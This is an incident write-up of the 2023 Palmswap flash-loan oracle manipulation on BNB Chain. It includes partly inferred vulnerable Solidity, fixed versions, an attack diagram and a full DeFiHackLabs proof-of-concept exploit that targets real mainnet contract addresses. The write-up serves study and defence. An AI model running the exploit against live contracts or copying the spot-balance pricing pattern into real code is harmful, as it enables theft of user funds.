# Palmswap — Price Oracle Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-07-24 |
| **Protocol** | Palmswap |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$900,000 |
| **Attacker** | [0xf84e...1366](https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366) |
| **Attack Contract** | [0x5525...f25](https://bscscan.com/address/0x55252a6d50bfad0e5f1009541284c783686f7f25) |
| **Attack Tx** | [0x62db...ac9](https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9) |
| **Vulnerable Contract** | [0xd990...fc1](https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1) (LiquidityEvent) |
| **Attack Block** | 30,248,637 |
| **Root Cause** | Vault balance manipulation via flash loan to distort PLP/USDP exchange rate (price oracle), then profit extraction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Palmswap_exp.sol) |
| **Reference** | [BlockSec Analysis](https://twitter.com/BlockSecTeam/status/1683680026766737408) |

---

## 1. Vulnerability Overview

Palmswap is a perpetual futures trading DEX operating on BSC. The protocol is designed so that liquidity providers deposit BUSDT (or other collateral assets) into the Vault and receive PLP (Palmswap Liquidity Provider) tokens and USDP (the protocol's native stablecoin).

**Core Vulnerability**: The `purchasePlp()` and `unstakeAndRedeemPlp()` functions of the `LiquidityEvent` contract internally calculate the PLP/USDP exchange rate dynamically based on the Vault's BUSDT balance. Because this exchange rate is an on-chain spot price with no external validation, it can be instantly manipulated by directly transferring large amounts of BUSDT into the Vault.

The attacker obtained a 3,000,000 BUSDT flash loan from Radiant Protocol and:
1. Purchased PLP tokens at a 1:1 ratio using 1,000,000 BUSDT (acquiring PLP)
2. Directly transferred 2,000,000 BUSDT into the Vault to artificially inflate the Vault's total asset balance
3. Thanks to the inflated balance, the PLP→USDP exchange rate rose from 1:1 to 1:1.9
4. Redeemed the held PLP for ~90% more USDP than originally paid, realizing the profit

This attack completes entirely within a single transaction: flash loan acquisition → price manipulation → profit extraction → repayment.

---

## 2. Vulnerable Code Analysis

### 2.1 On-Chain Spot Dependency in Price Ratio Calculation (Core Vulnerability)

`LiquidityEvent.purchasePlp()` and `unstakeAndRedeemPlp()` determine the PLP ↔ USDP exchange rate based on the Vault's current token balance (`BUSDT.balanceOf(Vault)`).

```solidity
// ❌ Vulnerable code — uses Vault's spot balance directly for exchange rate calculation
// Inside LiquidityEvent contract (inferred)

function _getPricePLP() internal view returns (uint256) {
    // Divides Vault's current total asset value (including BUSDT balance) by total PLP supply
    // ❌ Anyone can instantly manipulate this value by transferring BUSDT to the Vault
    uint256 vaultTotalAssets = BUSDT.balanceOf(address(vault));
    uint256 plpTotalSupply = IERC20(plp).totalSupply();
    return vaultTotalAssets * PRECISION / plpTotalSupply;
}

function purchasePlp(
    uint256 _amountIn,
    uint256 _minUsdp,
    uint256 _minPlp
) external returns (uint256 amountOut) {
    IERC20(busdt).transferFrom(msg.sender, address(this), _amountIn);
    // ❌ Applies spot rate at time of purchase (before manipulation → 1:1)
    uint256 usdpAmount = _amountIn; // simplified
    amountOut = usdpAmount * PRECISION / _getPricePLP();
    _mintPLP(msg.sender, amountOut);
}

function unstakeAndRedeemPlp(
    uint256 _plpAmount,
    uint256 _minOut,
    address _receiver
) external returns (uint256 usdpOut) {
    // ❌ Applies spot rate at time of redemption (after manipulation → 1:1.9)
    usdpOut = _plpAmount * _getPricePLP() / PRECISION;
    _burnPLP(msg.sender, _plpAmount);
    IERC20(usdp).transfer(_receiver, usdpOut);
}
```

```solidity
// ✅ Fixed code — uses manipulation-resistant TWAP oracle

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

function _getPricePLPSafe() internal view returns (uint256) {
    // ✅ Uses Chainlink TWAP or a validated external oracle
    (, int256 answer,, uint256 updatedAt,) = priceFeed.latestRoundData();
    require(block.timestamp - updatedAt <= MAX_PRICE_AGE, "Oracle: price data expired");
    require(answer > 0, "Oracle: invalid price");
    return uint256(answer);
}

function purchasePlp(
    uint256 _amountIn,
    uint256 _minUsdp,
    uint256 _minPlp
) external nonReentrant returns (uint256 amountOut) {
    // ✅ nonReentrant guard added
    IERC20(busdt).transferFrom(msg.sender, address(this), _amountIn);
    uint256 price = _getPricePLPSafe(); // ✅ Uses non-manipulable oracle price
    amountOut = _amountIn * PRECISION / price;
    require(amountOut >= _minPlp, "slippage: insufficient PLP amount");
    _mintPLP(msg.sender, amountOut);
}
```

**Issue**: Because the PLP price is entirely dependent on the Vault's real-time BUSDT balance, transferring a large amount of tokens into the Vault from outside instantly distorts the exchange rate. Combined with a flash loan, both the manipulation and profit extraction are possible within a single transaction.

### 2.2 Vault.buyUSDP() — Accepting Direct Transfers

```solidity
// ❌ Vulnerable code — processes tokens transferred directly to the Vault as-is
// Inferred from IVault interface

function buyUSDP(address _receiver) external returns (uint256) {
    // ❌ Vault accepts BUSDT that msg.sender transferred beforehand
    // Mints USDP equal to the transferred amount and delivers it to _receiver
    uint256 amount = BUSDT.balanceOf(address(this)) - usdpReserve;
    // ❌ At this point the Vault balance is inflated, distorting the price ratio
    _mintUSDP(_receiver, amount);
    usdpReserve += amount;
    return amount;
}
```

```solidity
// ✅ Fixed code — changed to transferFrom pattern

function buyUSDP(uint256 _amount, address _receiver) external nonReentrant returns (uint256) {
    // ✅ Explicitly receives funds from the caller; removes balance-based calculation
    BUSDT.transferFrom(msg.sender, address(this), _amount);
    uint256 usdpAmount = _convertToUSDP(_amount);
    _mintUSDP(_receiver, usdpAmount);
    return usdpAmount;
}
```

**Issue**: After `BUSDT.transfer(vault, 2_000_000e18)`, calling `Vault.buyUSDP()` causes the Vault to treat the externally injected 2,000,000 BUSDT as valid liquidity and reflect it in internal balance calculations. This causes the PLP price ratio to spike from 1:1 to 1:1.9.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys attack contract (0x5525...f25)
- Sets `approve(type(uint256).max)` on BUSDT for `plpManager` and `RadiantLP`
- Sets `approve(type(uint256).max)` on PLP token for `fPLP`

### 3.2 Execution Phase

| Step | Function Called | Purpose | Fund Flow |
|------|-----------|------|-----------|
| 1 | `RadiantLP.flashLoan()` | Obtain 3,000,000 BUSDT flash loan | Radiant → Attack Contract |
| 2 | `LiquidityEvent.purchasePlp(1_000_000e18, 0, 0)` | Buy PLP at cheap rate (1:1) before price manipulation | 1M BUSDT → PLP |
| 3 | `BUSDT.transfer(Vault, 2_000_000e18)` | Inflate Vault balance | 2M BUSDT → Vault |
| 4 | `Vault.buyUSDP(address(this))` | Confirm direct transfer and receive USDP | 2M BUSDT → USDP |
| 5 | `LiquidityEvent.unstakeAndRedeemPlp(plpAmount - 13_294e15, 0, this)` | Redeem PLP at inflated rate (1:1.9) | PLP → ~1.9M USDP |
| 6 | `USDP.transfer(Vault, amountUSDP - 3154e18)` | Return USDP to Vault | USDP → Vault |
| 7 | `Vault.sellUSDP(address(this))` | Swap USDP for BUSDT | USDP → BUSDT |
| 8 | Repay flash loan | Return 3M BUSDT + fees | Attack Contract → Radiant |
| 9 | Retain surplus | Secure net profit | ~$900K BUSDT remaining |

### 3.3 Attack Flow Diagram

```
Attacker (EOA)
    │
    ▼
┌─────────────────────────┐
│  Deploy Attack Contract │
│  Set approve() x3       │
└────────────┬────────────┘
             │ flashLoan(3,000,000 BUSDT)
             ▼
┌─────────────────────────┐        ┌──────────────────────┐
│   Radiant Finance       │───────▶│  Attack Contract     │
│   (Flash Loan Provider) │◀───────│  executeOperation()  │
└─────────────────────────┘ repay  └──────────┬───────────┘
                                              │
                    ┌─────────────────────────┤
                    │                         │
         [Step 2]   ▼                [Step 3] ▼
    ┌───────────────────────┐  ┌───────────────────────────┐
    │ LiquidityEvent        │  │ Palmswap Vault            │
    │ purchasePlp()         │  │                           │
    │ Deposit 1M BUSDT      │  │ Direct transfer 2M BUSDT  │
    │ Receive PLP (1:1)     │  │ Call buyUSDP()            │
    └───────────┬───────────┘  │ ❌ Vault balance inflated │
                │              └───────────────────────────┘
                │ Holding PLP                  │
                │              ┌───────────────┘
                │              │ Vault balance spikes →
                │              │ PLP price rises 1:1 → 1:1.9
                │              │
         [Step 5]▼             │
    ┌───────────────────────┐  │
    │ LiquidityEvent        │◀─┘
    │ unstakeAndRedeemPlp() │
    │ Redeem PLP → USDP     │
    │ Rate 1:1.9 applied ✅ │
    │ Receive ~1.9M USDP    │
    └───────────┬───────────┘
                │
         [Step 7]▼
    ┌───────────────────────┐
    │ Palmswap Vault        │
    │ sellUSDP()            │
    │ Swap USDP → BUSDT     │
    └───────────┬───────────┘
                │
                ▼
┌─────────────────────────────────────┐
│  Net Profit: ~$900,000 BUSDT        │
│  (After repaying 3M + fees)         │
└─────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker Profit**: ~$900,000 (BUSDT)
- **Protocol Loss**: ~$900,000 BUSDT liquidity drained from Vault
- **Time Elapsed**: Single transaction (atomic execution)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~$900K
// Attacker : https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366
// Attack Contract : https://bscscan.com/address/0x55252a6d50bfad0e5f1009541284c783686f7f25
// Vulnerable Contract : https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1
// Attack Tx : https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9

contract PalmswapTest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 PLP   = IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);
    IERC20 USDP  = IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);
    IVault Vault = IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);
    ILiquidityEvent LiquidityEvent =
        ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);
    IAaveFlashloan RadiantLP =
        IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);

    function testExploit() public {
        // [Setup] Start with 0 balance, configure approvals
        deal(address(BUSDT), address(this), 0);
        BUSDT.approve(plpManager, type(uint256).max);
        BUSDT.approve(address(RadiantLP), type(uint256).max);
        PLP.approve(fPLP, type(uint256).max);

        // [Step 1] Execute flash loan for 3M BUSDT from Radiant
        takeFlashLoanOnRadiant();
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {

        // [Step 2] Buy PLP with 1M BUSDT — price not yet manipulated, so 1:1 ratio
        uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);

        // [Step 3] Transfer 2M BUSDT directly to Vault → artificially inflate Vault balance
        BUSDT.transfer(address(Vault), 2_000_000 * 1e18);

        // [Step 4] Call buyUSDP() → Vault processes the direct transfer as valid liquidity
        //          At this moment PLP price spikes from 1:1 → 1:1.9
        Vault.buyUSDP(address(this));

        // [Step 5] Redeem held PLP for USDP at the inflated price (1:1.9)
        //          Receives ~900K more USDP than originally paid
        uint256 amountUSDP =
            LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));

        // [Step 6-7] Swap USDP → Vault → BUSDT
        USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);
        Vault.sellUSDP(address(this));

        // Flash loan is automatically repaid by Radiant after function returns
        return true;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Price calculation based on on-chain spot balance | CRITICAL | CWE-682 | `04_oracle_manipulation.md` | bZx #1, Harvest Finance, Pancake Bunny |
| V-02 | Single-block manipulation combined with flash loan | CRITICAL | CWE-362 | `02_flash_loan.md` | Harvest Finance ($34M), Mango Markets ($114M) |
| V-03 | Vault accepts direct transfers (pull pattern not applied) | HIGH | CWE-284 | `16_accounting_sync.md` | bZx #3 (iToken duplication) |
| V-04 | Atomic manipulation possible between liquidity add/remove | HIGH | CWE-362 | `20_trading_perpetual.md` | Multiple perpetual DEXes |

### V-01: Price Calculation Based on On-Chain Spot Balance

- **Description**: The `LiquidityEvent` contract directly references the Vault's real-time BUSDT balance (`balanceOf`) when calculating the PLP token price (exchange rate). This value can be instantly changed by anyone via an external transfer.
- **Impact**: Attacker can set the PLP → USDP exchange rate arbitrarily. Entire Vault liquidity is exposed to risk.
- **Attack Conditions**: (1) Sufficient capital for price manipulation (solvable with flash loans), (2) Ability to execute liquidity-add → manipulation → liquidity-remove sequence within the same transaction

### V-02: Single-Block Manipulation Combined with Flash Loan

- **Description**: Flash loans enable large-scale capital usage within a single transaction with no capital barrier. Combined with the spot price vulnerability in V-01, manipulation of the entire Vault liquidity pool is possible without collateral.
- **Impact**: Price manipulation at a scale of millions of dollars is achievable with minimal capital.
- **Attack Conditions**: V-01 vulnerability exists + access to a flash loan provider (Radiant, AAVE, etc.)

### V-03: Vault Accepts Direct Transfers (Pull Pattern Not Applied)

- **Description**: `Vault.buyUSDP()` accepts balances that were transferred directly before the function call, rather than receiving funds from `msg.sender` via `transferFrom`. This is the classic "balance snapshot" vulnerable pattern.
- **Impact**: Attacker can inject arbitrary amounts into the Vault using the `transfer + buyUSDP()` pattern, distorting internal accounting.
- **Attack Conditions**: The Vault's `buyUSDP()` function does not directly receive tokens from the caller

### V-04: Atomic Manipulation Possible Between Liquidity Add/Remove

- **Description**: Within the same transaction, liquidity addition (`purchasePlp`) → Vault manipulation → liquidity removal (`unstakeAndRedeemPlp`) executes sequentially with no restrictions. There is no minimum holding period (lock-up) or same-block restriction.
- **Impact**: Temporary liquidity provision and immediate profit extraction are possible within a single transaction.
- **Attack Conditions**: The same address can add and remove liquidity within the same transaction

---

## 6. Remediation Recommendations

### Immediate Actions

#### V-01 Fix: Introduce TWAP Oracle

```solidity
// ✅ Replace price calculation with Chainlink oracle
interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80 roundId, int256 answer, uint256 startedAt,
        uint256 updatedAt, uint80 answeredInRound
    );
}

contract LiquidityEvent {
    AggregatorV3Interface public immutable priceFeed;
    uint256 public constant MAX_PRICE_AGE = 3600; // 1 hour

    // ✅ Use validated oracle price instead of spot balance
    function _getValidatedPrice() internal view returns (uint256) {
        (, int256 price,, uint256 updatedAt,) = priceFeed.latestRoundData();
        require(block.timestamp - updatedAt <= MAX_PRICE_AGE, "Oracle stale");
        require(price > 0, "Invalid price");
        return uint256(price);
    }
}
```

#### V-03 Fix: Apply Pull Pattern

```solidity
// ✅ Use transferFrom instead of direct transfer
function buyUSDP(uint256 _amount, address _receiver) external nonReentrant returns (uint256) {
    // ✅ Explicitly receive funds from caller
    IERC20(busdt).safeTransferFrom(msg.sender, address(this), _amount);
    uint256 usdpOut = _calculateUSDP(_amount);
    _mintUSDP(_receiver, usdpOut);
    return usdpOut;
}
```

#### V-04 Fix: Minimum Holding Period and Same-Block Restriction

```solidity
// ✅ Enforce minimum holding period after liquidity addition
mapping(address => uint256) public lastPurchaseBlock;

function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp)
    external nonReentrant returns (uint256 amountOut)
{
    lastPurchaseBlock[msg.sender] = block.number;
    // ... logic
}

function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver)
    external nonReentrant returns (uint256)
{
    // ✅ Enforce minimum 1-block wait after liquidity addition (blocks flash loan single-Tx attack)
    require(
        block.number > lastPurchaseBlock[msg.sender],
        "Cannot add and remove liquidity in same block"
    );
    // ... logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Spot price dependency | Apply Chainlink TWAP oracle; set single-block price change limit (circuit breaker) |
| V-02: Flash loan combination | Apply block-based cooldown for liquidity add/remove; block re-entry within same Tx |
| V-03: Direct transfer acceptance | Standardize all fund receipt to `transferFrom` pattern; remove balance-based accounting |
| V-04: Atomic manipulation | Enforce minimum liquidity holding period (e.g., 1 block or 1 hour); apply delayed withdrawal for large liquidity changes |
| Common | Set per-transaction liquidity change limits; build anomaly detection monitoring system |

---

## 7. Lessons Learned

1. **On-chain spot prices cannot be used as oracles**: `balanceOf()` or `reserve` values can be instantly manipulated within the same block using a flash loan. All DeFi protocols, including perpetual DEXes, must use time-weighted average prices (TWAP) or external oracles such as Chainlink.

2. **Liquidity addition and removal must be separated by a block boundary**: Any architecture that allows liquidity provision → price manipulation → liquidity withdrawal within the same transaction is inherently vulnerable to flash loan attacks. A cooldown of at least 1 block must be enforced.

3. **Apply the pull pattern consistently**: A contract structure that accepts directly transferred tokens as valid input (the balance snapshot approach) becomes a vector for internal state manipulation through external fund injection. Always receive funds explicitly via `transferFrom`.

4. **Flash loans eliminate the capital barrier**: The assumption that "a large amount of capital is required, so it's practically infeasible" collapses in the face of flash loans, regardless of the vulnerability. Flash loan scenarios must always be included when calculating the cost of price manipulation.

5. **Perpetual DEXes must pay special attention to compound vulnerabilities**: In perpetual trading protocols where leverage, liquidity pools, oracles, and liquidation mechanisms are intricately intertwined, a vulnerability in a single component can affect the entire liquidity pool. Harvest Finance, Pancake Bunny, and Palmswap all fell victim to the same pattern.

6. **Explicitly verify economic invariants**: The invariant that "the value of PLP received on liquidity addition and USDP returned on removal must be equivalent" must always be reviewed to determine whether it can be broken within a single transaction.

---

## 8. On-Chain Verification

> **Note**: This section records the results of on-chain transaction verification performed via the `cast` (Foundry) tool. In environments with limited network access, manual cross-verification can be performed on the transaction detail page of BSCScan.

### 8.1 Key Transaction Information

| Field | Value |
|------|-----|
| **Tx Hash** | `0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9` |
| **Attack Block** | 30,248,637 |
| **Attacker EOA** | `0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366` |
| **Attack Contract** | `0x55252a6d50bfad0e5f1009541284c783686f7f25` |
| **Vulnerable Contract** | `0xd990094a611c3de34664dd3664ebf979a1230fc1` (LiquidityEvent) |
| **Chain** | BSC (Chain ID: 56) |
| **Vault** | `0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A` |
| **Flash Loan Provider** | `0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281` (Radiant) |

### 8.2 Attack Flow Verification (Based on PoC Code)

| Step | PoC Value | Notes |
|------|--------|------|
| Flash loan amount | 3,000,000 BUSDT | Radiant AAVE v2 pool |
| purchasePlp input | 1,000,000 BUSDT | Purchased at 1:1 ratio |
| Direct Vault injection | 2,000,000 BUSDT | For price manipulation |
| PLP → USDP redemption rate | ~1:1.9 | After 2M BUSDT injection |
| PLP deduction (slippage correction) | `amountOut - 13,294e15` | Corrects for decimal loss |
| Deduction on USDP→BUSDT swap | `amountUSDP - 3,154e18` | Fees and slippage |
| Estimated final profit | ~$900,000 BUSDT | After flash loan fee deduction |

### 8.3 Verification Reference Links

- **Attack Tx**: [BSCScan](https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9)
- **Attack Contract**: [BSCScan](https://bscscan.com/address/0x55252a6d50bfad0e5f1009541284c783686f7f25)
- **LiquidityEvent Contract**: [BSCScan](https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1)
- **BlockSec Analysis**: [Twitter/X](https://twitter.com/BlockSecTeam/status/1683680026766737408)
- **DeFiHackLabs PoC**: [GitHub](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Palmswap_exp.sol)